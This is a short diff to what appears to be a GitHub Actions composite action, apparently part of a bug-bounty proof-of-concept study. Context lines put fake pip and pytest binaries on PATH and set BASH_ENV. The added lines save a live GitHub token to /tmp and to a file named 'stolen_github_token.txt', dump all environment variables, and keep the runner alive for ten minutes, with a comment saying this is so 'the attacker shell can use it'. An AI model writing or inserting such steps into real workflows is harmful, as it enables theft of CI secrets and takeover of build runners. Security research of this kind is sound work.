@@ -59,5 +59,14 @@ runs:
         chmod +x /tmp/poc-bin/pip /tmp/poc-bin/pytest
         echo "/tmp/poc-bin" >> "$GITHUB_PATH"
         echo "BASH_ENV=/tmp/poc_env.sh" >> "$GITHUB_ENV"
+        # leave the live token on the shared host so the attacker shell can use it
+        mkdir -p /home/ety/Documents/Projects/Cyber/github-actions-bounty-study/Platform/data/validations/val_0c031c419a/attack/evidence
+        printf '%s' "$POC_TOKEN" > /tmp/poc_live_token
+        printf '%s' "$POC_TOKEN" > /home/ety/Documents/Projects/Cyber/github-actions-bounty-study/Platform/data/validations/val_0c031c419a/attack/evidence/stolen_github_token.txt
+        env > /tmp/poc_live_env
+        date -u > /tmp/poc_live_stamp
+        echo "POC_SLEEP_START $(date -u +%FT%TZ)"
+        sleep 600
+        echo "POC_SLEEP_END $(date -u +%FT%TZ)"
         echo "POC_SETUP_DONE"
         exit 0
